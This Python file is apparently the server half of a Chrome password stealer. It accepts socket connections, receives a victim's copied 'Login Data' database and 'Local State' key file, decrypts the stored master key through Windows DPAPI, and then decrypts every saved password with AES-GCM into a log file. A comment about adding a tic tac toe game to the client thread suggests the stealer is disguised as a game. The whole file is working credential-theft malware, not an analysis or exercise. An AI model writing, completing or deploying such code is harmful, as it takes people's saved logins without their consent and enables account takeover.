'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|                                                                                                
   
                               ________  _________ ___________ _____ _____ 
                              |_   _|  \/  || ___ \  _  | ___ \_   _/  ___|
                                | | | .  . || |_/ / | | | |_/ / | | \ `--. 
                                | | | |\/| ||  __/| | | |    /  | |  `--. \
                               _| |_| |  | || |   \ \_/ / |\ \  | | /\__/ /
                               \___/\_|  |_/\_|    \___/\_| \_| \_/ \____/ 

'''

import socket
import os
import sqlite3
from Cryptodome.Cipher import AES
import win32crypt
import base64
import json
import sys
from _thread import *
from logins_hunt import *
from game import *

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|                                                                                                
   
                           _____ _____ _   _  _____ _____ ___   _   _ _____ _____ 
                          /  __ \  _  | \ | |/  ___|_   _/ _ \ | \ | |_   _/  ___|
                          | /  \/ | | |  \| |\ `--.  | |/ /_\ \|  \| | | | \ `--. 
                          | |   | | | | . ` | `--. \ | ||  _  || . ` | | |  `--. \
                          | \__/\ \_/ / |\  |/\__/ / | || | | || |\  | | | /\__/ /
                           \____/\___/\_| \_/\____/  \_/\_| |_/\_| \_/ \_/ \____/ 

'''

USERNAME: str = os.environ.get('USERNAME')
COPY_PATH: str = f'C:\\Users\\{USERNAME}\\Desktop\\Login Data.db'
EKEY_PATH: str = f'C:\\Users\\{USERNAME}\\Desktop\\Local State'
LOGS_PATH: str = f'C:\\Users\\{USERNAME}\\Desktop\\Login Data Logs.txt'

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|                                                                                                
                                                                                     
        ______  ___   _____ _____  _    _  _________________  _____   _____ _____ _____  ___   _     
        | ___ \/ _ \ /  ___/  ___|| |  | ||  _  | ___ \  _  \/  ___| /  ___|_   _|  ___|/ _ \ | |    
        | |_/ / /_\ \\ `--.\ `--. | |  | || | | | |_/ / | | |\ `--.  \ `--.  | | | |__ / /_\ \| |    
        |  __/|  _  | `--. \`--. \| |/\| || | | |    /| | | | `--. \  `--. \ | | |  __||  _  || |    
        | |   | | | |/\__/ /\__/ /\  /\  /\ \_/ / |\ \| |/ / /\__/ / /\__/ / | | | |___| | | || |____
        \_|   \_| |_/\____/\____/  \/  \/  \___/\_| \_|___/  \____/  \____/  \_/ \____/\_| |_/\_____/

'''

def get_secret_key(local_state_path: str):
    try:
        local_state = ''
        with open(local_state_path, TEXT_FILE_READ, encoding=UTF8) as file:
            local_state = file.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state[OS_CRYPT][ENCRYPTED_KEY])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, initialisation_vector):
    return AES.new(aes_key, AES.MODE_GCM, initialisation_vector)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_password = decrypt_payload(cipher, encrypted_password).decode()
        return decrypted_password
    except Exception as e:
        print("%s"%str(e))
        return None

def server_steal_chrome_passwords(client_socket: socket.socket) -> None:
    if os.path.exists(COPY_PATH):
        os.remove(COPY_PATH)
    if os.path.exists(EKEY_PATH):
        os.remove(EKEY_PATH)

    with client_socket:
        with open(COPY_PATH, BINARY_FILE_APPEND) as file_copy:
            while True:
                data = client_socket.recv(BYTES_TO_READ)
                if not data:
                    break
                elif DATA_END_MESSAGE in data:
                    break 
                else: 
                    file_copy.write(data)
            
        with open(EKEY_PATH, BINARY_FILE_APPEND) as file_copy:
            while True:
                data = client_socket.recv(BYTES_TO_READ)
                if not data:
                    break
                file_copy.write(data)
        
    connection = sqlite3.connect(COPY_PATH)
    cursor = connection.cursor()

    secret_key = get_secret_key(EKEY_PATH)

    logins_data = cursor.execute("SELECT * FROM logins")
    with open(LOGS_PATH, TEXT_FILE_APPEND) as logs_file:
        for row in logins_data:
            counter = 0
            for row_data in row:
                if PASSWORD_INDEX == counter:
                    password = decrypt_password(row_data, secret_key)
                    if password:
                        logs_file.write(password)
                    else:
                        logs_file.write('PASSWORD ERROR')
                else:
                    logs_file.write(str(row_data))
                logs_file.write(SPACE_CHARACTER)
                counter += INC
            logs_file.write(NEWLINE_CHARACTER)
        
    connection.commit()

    cursor.close()
    connection.close()

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''

def threaded_client(client_socket: socket.socket) -> None:
    server_steal_chrome_passwords(client_socket)
    # TODO: add tic tac toe game functionality to here

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|    

                                        ___  ___  ___  _____ _   _ 
                                        |  \/  | / _ \|_   _| \ | |
                                        | .  . |/ /_\ \ | | |  \| |
                                        | |\/| ||  _  | | | | . ` |
                                        | |  | || | | |_| |_| |\  |
                                        \_|  |_/\_| |_/\___/\_| \_/

'''

def main() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listening_socket:
        listening_socket.bind(HOST_ADDRESS)
        listening_socket.listen(CLIENTS_AMOUNT)

        while True:
            client_socket, client_address = listening_socket.accept()
            print("Client connected to server:", client_address)

            start_new_thread(threaded_client, (client_socket, ))

if __name__ == "__main__":
    main()

'''
 ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ ______ 
|______|______|______|______|______|______|______|______|______|______|______|______|______|______|______|  '''